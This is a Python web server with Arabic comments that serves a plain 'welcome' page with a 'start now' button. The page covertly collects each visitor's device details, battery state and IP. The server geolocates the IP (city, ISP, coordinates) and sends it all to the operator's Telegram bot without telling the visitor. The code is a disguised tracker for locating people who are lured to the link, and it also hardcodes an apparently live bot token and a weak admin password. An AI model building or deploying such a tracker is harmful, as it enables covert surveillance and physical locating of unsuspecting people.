import http.server
import socketserver
import socket
import json
import urllib.request
import urllib.parse
import os
from datetime import datetime

PORT = 8080
BOT_TOKEN = "8672931585:AAEXBmEvxeM5UyMMBRZq4sDJPE1MHdUqINc"  # 🔴 Revoke فوراً
CHAT_ID = "ضع_معرفك_هنا"
STATS_PASSWORD = "admin123"  # 🔑 غيرها لكلمة سر قوية
STATS_FILE = "visits.json"

# تحميل الإحصائيات من الملف
def load_stats():
    if os.path.exists(STATS_FILE):
        try:
            with open(STATS_FILE, 'r', encoding='utf-8') as f:
                return json.load(f)
        except:
            pass
    return {"count": 0, "visitors": []}

def save_stats(stats):
    try:
        with open(STATS_FILE, 'w', encoding='utf-8') as f:
            json.dump(stats, f, ensure_ascii=False, indent=2)
    except Exception as e:
        print(f"خطأ حفظ: {e}")

VISITS = load_stats()


HTML_PAGE = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>موقعي</title>
<style>
* { margin: 0; padding: 0; box-sizing: border-box; }
body {
    font-family: Arial, sans-serif;
    background: #000;
    min-height: 100vh;
    overflow: hidden;
    display: flex;
    justify-content: center;
    align-items: center;
}
.bg {
    position: fixed;
    inset: 0;
    background: radial-gradient(circle at 50% 50%, #001a1a, #000 70%);
    z-index: -1;
    animation: pulse 4s infinite alternate;
}
@keyframes pulse { from { opacity: 0.6; } to { opacity: 1; } }
.container { text-align: center; z-index: 1; padding: 20px; }
.neon-title {
    color: #0ff;
    font-size: 3rem;
    margin-bottom: 40px;
    text-shadow: 0 0 10px #0ff, 0 0 20px #0ff, 0 0 40px #0ff, 0 0 80px #0ff;
    animation: flicker 2s infinite alternate;
}
@keyframes flicker { 0%,100% { opacity: 1; } 50% { opacity: 0.85; } }
.neon-btn {
    padding: 20px 60px;
    font-size: 1.5rem;
    font-weight: bold;
    color: #0ff;
    background: transparent;
    border: 2px solid #0ff;
    border-radius: 12px;
    cursor: pointer;
    transition: 0.3s;
    text-shadow: 0 0 10px #0ff;
    box-shadow: 0 0 20px #0ff, inset 0 0 20px rgba(0,255,255,0.2);
}
.neon-btn:hover, .neon-btn:active {
    background: #0ff;
    color: #000;
    box-shadow: 0 0 40px #0ff, 0 0 80px #0ff, 0 0 120px #0ff;
    transform: scale(1.05);
}
#response {
    margin-top: 30px;
    color: #0ff;
    font-size: 1.2rem;
    text-shadow: 0 0 10px #0ff;
    min-height: 30px;
}
</style>
</head>
<body>
    <div class="bg"></div>
    <div class="container">
        <h1 class="neon-title">مرحباً بك</h1>
        <button class="neon-btn" onclick="startNow()">ابدأ الآن</button>
        <p id="response"></p>
    </div>

    <script>
    async function startNow() {
        document.getElementById('response').textContent = 'جاري...';

        let data = {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            screen: screen.width + 'x' + screen.height,
            battery: 'غير متاح',
            charging: 'غير متاح'
        };

        try {
            const bat = await navigator.getBattery();
            data.battery = Math.round(bat.level * 100) + '%';
            data.charging = bat.charging ? '🔌 يشحن' : '🔋 لا يشحن';
        } catch(e) {
            data.battery = 'غير مدعوم';
            data.charging = 'غير مدعوم';
        }

        await fetch('/api/track', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(data)
        });

        document.getElementById('response').textContent = 'أهلاً 🚀';
    }
    </script>
</body>
</html>
"""


def get_ip_info(ip):
    if ip.startswith('127.') or ip.startswith('192.168.') or ip.startswith('10.'):
        try:
            with urllib.request.urlopen('https://api.ipify.org', timeout=5) as r:
                ip = r.read().decode()
        except:
            return None

    try:
        url = f"http://ip-api.com/json/{ip}?fields=status,country,city,isp,query,lat,lon,regionName&lang=ar"
        with urllib.request.urlopen(url, timeout=5) as r:
            return json.loads(r.read().decode())
    except Exception as e:
        print(f"خطأ IP API: {e}")
        return None


def send_telegram(text, chat_id=None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = urllib.parse.urlencode({
        'chat_id': chat_id or CHAT_ID,
        'text': text,
        'parse_mode': 'HTML'
    }).encode()
    try:
        urllib.request.urlopen(url, data=data, timeout=5)
    except Exception as e:
        print(f"خطأ تلغرام: {e}")


def send_location(lat, lon, chat_id=None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendLocation"
    data = urllib.parse.urlencode({
        'chat_id': chat_id or CHAT_ID,
        'latitude': lat,
        'longitude': lon
    }).encode()
    try:
        urllib.request.urlopen(url, data=data, timeout=5)
    except Exception as e:
        print(f"خطأ إرسال الموقع: {e}")


def send_screenshot(url_site, chat_id=None):
    """إرسال لقطة شاشة للموقع"""
    # API مجاني يجيب لقطة شاشة
    screenshot_url = f"https://image.thum.io/get/width/600/crop/800/{url_site}"
    
    api_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
    
    # نرسل الرابط مباشرة لتلغرام
    data = urllib.parse.urlencode({
        'chat_id': chat_id or CHAT_ID,
        'photo': screenshot_url,
        'caption': f'📸 لقطة شاشة للموقع\n{url_site}'
    }).encode()
    
    try:
        urllib.request.urlopen(api_url, data=data, timeout=15)
        print("✅ تم إرسال لقطة الشاشة")
    except Exception as e:
        print(f"خطأ لقطة الشاشة: {e}")


class MyHandler(http.server.BaseHTTPRequestHandler):

    def do_GET(self):
        if self.path == '/' or self.path == '/index.html':
            self.send_response(200)
            self.send_header('Content-Type', 'text/html; charset=utf-8')
            self.end_headers()
            self.wfile.write(HTML_PAGE.encode('utf-8'))

        elif self.path == '/stats':
            # طلب كلمة سر
            query = urllib.parse.urlparse(self.path).query
            params = urllib.parse.parse_qs(query)
            pwd = params.get('pwd', [''])[0]

            if pwd != STATS_PASSWORD:
                # صفحة تسجيل دخول
                login_html = """
                <!DOCTYPE html>
                <html dir="rtl"><head><meta charset="UTF-8">
                <title>تسجيل دخول</title>
                <style>
                    body { background:#000; color:#0ff; font-family:Arial;
                           display:flex; justify-content:center; align-items:center;
                           height:100vh; margin:0; }
                    form { text-align:center; padding:40px; border:2px solid #0ff;
                           border-radius:15px; box-shadow:0 0 30px #0ff; }
                    input { padding:12px; font-size:1.2rem; background:#000;
                            color:#0ff; border:1px solid #0ff; border-radius:8px;
                            margin:15px; outline:none; }
                    button { padding:12px 30px; font-size:1.1rem; background:#0ff;
                             color:#000; border:none; border-radius:8px;
                             cursor:pointer; font-weight:bold; }
                    button:hover { box-shadow:0 0 30px #0ff; }
                    h2 { text-shadow:0 0 20px #0ff; }
                </style></head><body>
                <form method="GET" action="/stats">
                    <h2>🔐 دخول الإحصائيات</h2>
                    <input type="password" name="pwd" placeholder="كلمة السر" required>
                    <br>
                    <button type="submit">دخول</button>
                </form>
                </body></html>
                """
                self.send_response(200)
                self.send_header('Content-Type', 'text/html; charset=utf-8')
                self.end_headers()
                self.wfile.write(login_html.encode('utf-8'))
                return

            # عرض الإحصائيات
            total = VISITS["count"]
            rows = ""
            for v in VISITS["visitors"][-50:][::-1]:
                rows += f"<tr><td>{v.get('time','')}</td><td>{v.get('ip','')}</td><td>{v.get('city','')}</td><td>{v.get('isp','')}</td><td>{v.get('battery','')}</td></tr>"

            html = f"""
            <!DOCTYPE html>
            <html dir="rtl"><head><meta charset="UTF-8">
            <title>الإحصائيات</title>
            <style>
                body {{ background:#000; color:#0ff; font-family:Arial; padding:20px; }}
                h1 {{ text-shadow:0 0 20px #0ff; }}
                .count {{ font-size:3rem; text-align:center; margin:20px;
                          text-shadow:0 0 30px #0ff; }}
                table {{ width:100%; border-collapse:collapse; margin-top:20px; }}
                th,td {{ border:1px solid #0ff; padding:8px; text-align:right; font-size:0.9rem; }}
                th {{ background:#003333; }}
                tr:hover {{ background:#001a1a; }}
            </style></head><body>
            <h1>📊 إحصائيات الموقع</h1>
            <div class="count">👥 عدد الزوار: {total}</div>
            <table>
                <tr><th>الوقت</th><th>IP</th><th>المدينة</th><th>الشبكة</th><th>البطارية</th></tr>
                {rows if rows else '<tr><td colspan="5">لا يوجد زوار بعد</td></tr>'}
            </table>
            </body></html>
            """
            self.send_response(200)
            self.send_header('Content-Type', 'text/html; charset=utf-8')
            self.end_headers()
            self.wfile.write(html.encode('utf-8'))

        else:
            self.send_response(404)
            self.end_headers()

    def do_POST(self):
        if self.path == '/api/track':
            length = int(self.headers.get('Content-Length', 0))
            body = self.rfile.read(length).decode('utf-8')

            try:
                data = json.loads(body)
            except:
                data = {}

            ip = self.client_address[0]
            forwarded = self.headers.get('X-Forwarded-For')
            if forwarded:
                ip = forwarded.split(',')[0].strip()

            info = get_ip_info(ip)

            if info and info.get('status') == 'success':
                country = info.get('country', '؟')
                city = info.get('city', '؟')
                region = info.get('regionName', '؟')
                isp = info.get('isp', '؟')
                real_ip = info.get('query', ip)
                lat = info.get('lat')
                lon = info.get('lon')
            else:
                country = city = region = isp = 'غير معروف'
                real_ip = ip
                lat = lon = None

            now = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

            VISITS["count"] += 1
            VISITS["visitors"].append({
                "time": now,
                "ip": real_ip,
                "country": country,
                "city": city,
                "isp": isp,
                "battery": data.get('battery', '؟')
            })
            save_stats(VISITS)

            msg = (
                f"🚨 <b>شخص جديد دخل الموقع (#{VISITS['count']})</b>\n\n"
                f"🕐 <b>الوقت:</b> {now}\n"
                f"🌐 <b>IP:</b> <code>{real_ip}</code>\n"
                f"🏳️ <b>الدولة:</b> {country}\n"
                f"🏙️ <b>المدينة:</b> {city} - {region}\n"
                f"📡 <b>الشبكة (ISP):</b> {isp}\n\n"
                f"🔋 <b>البطارية:</b> {data.get('battery','؟')}\n"
                f"⚡ <b>حالة الشحن:</b> {data.get('charging','؟')}\n\n"
                f"📱 <b>الجهاز:</b> {data.get('platform','؟')}\n"
                f"🔤 <b>اللغة:</b> {data.get('language','؟')}\n"
                f"🖥️ <b>الشاشة:</b> {data.get('screen','؟')}\n\n"
                f"📊 <b>إجمالي الزوار:</b> {VISITS['count']}"
            )

            send_telegram(msg)

            if lat and lon:
                send_location(lat, lon)

            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(b'{"status":"ok"}')
        else:
            self.send_response(404)
            self.end_headers()

    def log_message(self, format, *args):
        pass


def get_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(('8.8.8.8', 80))
        ip = s.getsockname()[0]
    except:
        ip = '127.0.0.1'
    finally:
        s.close()
    return ip


if __name__ == '__main__':
    ip = get_ip()
    print("=" * 55)
    print("✅ السيرفر شغال!")
    print(f"🌐 الموقع: http://localhost:{PORT}")
    print(f"📱 من أجهزة ثانية: http://{ip}:{PORT}")
    print(f"📊 الإحصائيات: http://localhost:{PORT}/stats?pwd={STATS_PASSWORD}")
    print(f"💾 ملف الحفظ: {STATS_FILE}")
    print("=" * 55)

    with socketserver.TCPServer(("0.0.0.0", PORT), MyHandler) as httpd:
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            save_stats(VISITS)
            print("\n🛑 تم إيقاف السيرفر وحفظ البيانات")